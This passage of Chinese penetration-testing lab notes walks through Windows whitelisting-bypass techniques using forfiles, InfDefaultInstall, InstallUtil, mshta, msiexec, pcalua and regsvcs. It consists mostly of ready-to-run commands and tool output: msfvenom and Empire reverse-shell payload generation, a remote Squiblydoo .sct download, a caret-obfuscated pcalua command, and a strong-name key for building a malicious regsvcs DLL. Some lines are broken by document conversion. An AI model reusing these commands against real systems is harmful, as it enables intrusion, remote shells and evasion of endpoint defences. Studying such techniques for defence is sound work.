环境： Kali: 10.100.19.19 Win7 : 20.100.0.25 攻击手法： 1、forfiles /p
c:\\windows\\system32 /m notepad.exe /c calc.exe
![](media/image51.jpeg){width="5.879385389326334in"
height="3.5108333333333333in"}
## 本地-IEExec
环 境 ： Kali: 10.100.19.19 Win7 : 20.100.0.25 攻 击 手 法 ：
C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\IEExec.exe
![](media/image52.jpeg){width="5.885790682414698in"
height="2.3374989063867018in"}
> 报错，待解决**9.InfDefaultInstall** InfDefaultInstall.exe shady.inf
>
> \[Version\]
>
> Signature=\$CHICAGO\$
>
> \[DefaultInstall\] UnregisterDlls = Squiblydoo
>
> \[Squiblydoo\]
> 11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092
> f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Mi
> nimalist.sct
![](media/image53.jpeg){width="5.8799212598425195in"
height="3.9920833333333334in"}
## InstaIIUtil
实验环境： 攻击机 ：Kali（10.100.18.20） 被攻击机 ：Windows7
（10.100.18.21） 工 具 地 址 ：
https://github.com/khr0x40sh/WhiteListEvasion.git 例子: 生成sc
有效载荷python InstallUtil.py \--csfiletemp.cs\--exefile temp.exe
\--payload windows/meterpreter/reverse_https \--lhost 172.16.8.246
\--lport 443 实战演示： 生成二进制文件 .\\csc.exe pentestlab.cs
![](media/image54.jpeg){width="5.7448589238845145in"
height="1.0033333333333334in"}
执行二进制文件 .\\InstallUtil.exe /logfile= /logtoconsole=false /u
pentestlab.exe
![](media/image55.jpeg){width="5.8702220034995625in"
height="0.9945833333333334in"}
msf 设置
![](media/image56.jpeg){width="5.872414698162729in"
height="3.0845833333333332in"}
成功获取session
![](media/image57.jpeg){width="5.883589238845144in"
height="2.7316666666666665in"}
获取shell
![](media/image58.jpeg){width="5.884074803149606in"
height="6.329583333333333in"}
## MSHTA
环境： Kali: 10.100.19.19 Win7 : 20.100.0.25
攻击手法： 1、在kali 上启动Empire 框架后输入：
> listeners uselistener http
>
> set Host [http://10.100.19.19](http://10.100.19.19/)
>
> set Port 8080 execute
输出
> (Empire: listeners) \> uselistener http
>
> (Empire: listeners/http) \> set Host
> [http://10.100.19.19](http://10.100.19.19/) (Empire: listeners/http)
> \> set Port 8080
>
> (Empire: listeners/http) \> set Name mshta (Empire: listeners/http) \>
> execute
>
> \[\*\] Starting listener \'mshta\'
-   Serving Flask app \"http\" (lazy loading)
-   Environment: production
> WARNING: Do not use the development server in a production
> environment. Use a production WSGI server instead.
-   Debug mode: off
> \[+\] Listener successfully started! (Empire: listeners/http) \>
> listeners
>
> \[\*\] Active listeners:
>
> Name Module Host Delay/Jitter KillDate
>
> mshta http http://10.100.19.19:8080 5/0.0 (Empire: listeners) \>
![](media/image59.jpeg){width="5.877063648293963in"
height="2.575833333333333in"}
2、Empire 生成hta 文件
> usestager windows/hta set Listener http
>
> set OutFile /root/Desktop/1.hta execute
>
> Python 开启web 服务，受害机执行cd /root/Desktop/
>
> python3 -m http.server 80
>
> Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) \...
Win7 执行：
> mshta.exe http://10.100.19.19:80/1.hta\[payload
> 监听的端口和下载的端口不能同一个\]
Empire 成功收到受害机shell
![](media/image60.jpeg){width="5.87682852143482in" height="2.98375in"}
## MSIexec
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法： 1、通过msfvenom 生成payload msfvenom -a x86 -f msi -p
windows/exec CMD=calc.exe -o calc.png
![](media/image61.jpeg){width="5.8744127296587925in"
height="0.953332239720035in"}
2、搭建简单web 服务器 python -m SimpleHTTPServer 80
![](media/image62.jpeg){width="5.897064741907261in"
height="0.6554166666666666in"}
3、在本地计算机上下载文件后，使用msiexec 运行payload msiexec /q /i
![](media/image63.jpeg){width="5.882600612423447in" height="2.73625in"}
Win7 复现不成功
![](media/image64.jpeg){width="5.9118744531933505in"
height="3.319061679790026in"}
Win2008 复现成功
![](media/image65.jpeg){width="6.04799321959755in"
height="2.841666666666667in"}
Win2016 复现成功
## Pcalua
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法：
> C:\\windows\\system32\\pcalua.exe -a C:\\file.lnk
> C:\\windows\\system32\\pcalua.exe -a notepad.exe
>
> C:\\windows\\system32\\pcalua.exe -a
> \\\\server\\payload.dll（本地执行远程主机payloa d）
![](media/image66.jpeg){width="5.884850174978128in"
height="1.8562489063867016in"}
> p\^c\^a\^l\^u\^a\^ \^-\^n\^
> \^-\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a
>
> \^a\^a\^a\^a\^a
>
> \^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^
> a\^a\^a\^a\^a
>
> \^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^
> a\^a\^a\^a\^a
>
> \^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^
> a\^a\^a\^a\^a
>
> \^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a
>
> \^\^a\^a\^a\^a
>
> \^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a
>
> \^a\^\^a\^a\^a
>
> \^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a\^a
>
> \^a\^a\^\^a\^a
>
> \^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^
> a\^n\^a\^n\^a\^
> n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^a\^a\^a\^a\^a\^a\^a\^a\^a\^\^a\^a\^a\^a\^a\^a\^a
>
> \^a\^n\^a\^n\^a
>
> \^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a
>
> \^n\^a\^n\^a\^n
>
> \^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n
>
> \^a\^n\^a\^n\^a
>
> \^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a
>
> \^n\^a\^n\^a\^n
>
> \^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n\^a\^n
> notepad.exe
![](media/image67.jpeg){width="5.868902012248469in"
height="2.475in"}![](media/image68.jpeg){width="5.847038495188102in"
height="0.6665616797900262in"}
## Regsvcs/Regasm（.NET 服务安装工具/程序集注册工具）
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法：
1.使用powershell 转换出key.snk
> PS D:\\\> \$key = \'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2P
>
> WGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW
> 979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0q
> u/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv
> 7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNO
> E79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hito
> lufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0
> 361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRv
> kWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOef
> cacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7q
> eEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmt
>
> L6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLN
> iHfVjNi53Yg4=\'
>
> PS D:\\\> \$Content = \[System.Convert\]::FromBase64String(\$key) PS
> D:\\\> Set-Content key.snk -Value \$Content -Encoding Byte
![](media/image69.jpeg){width="5.88355971128609in"
height="2.7820833333333335in"}
2、MsfVenom 生成 C#版的 ShellCode，复制ShellCode
到一个文件中命名为regsvcs.cs
> msfvenom -a x86 -platform Windows -p windows/meterpreter/reverse_tcp
> LHOST
>
> =10.100.19.19 LPORT=4444 -f csharp
>
> !\[image\](./images/7AF3D6434406451FB84F9676ED26B6C.png)
>
> using System;
>
> using System.EnterpriseServices; using System.Runtime.InteropServices;
>
> /\*
>
> Author: Casey Smith, Twitter: \@subTee License: BSD 3-Clause
>
> Create Your Strong Name Key -\> key.snk
>
> \$key = \'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP
>
> 9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzV
>
> AgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaff
> HS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531
> ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpV
> P1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh
>
> +WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsS
> VWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerj
> mDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEH
> PX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0
> OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv
> 8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi5
> 3Yg4=\'
>
> \$Content = \[System.Convert\]::FromBase64String(\$key) Set-Content
> key.snk -Value \$Content -Encoding Byte
>
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
> /r:System.EnterpriseSe rvices.dll /target:library /out:regsvcs.dll
> /keyfile:key.snk regsvcs.cs
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe
> regsvcs.dll
>
> \[OR\]
>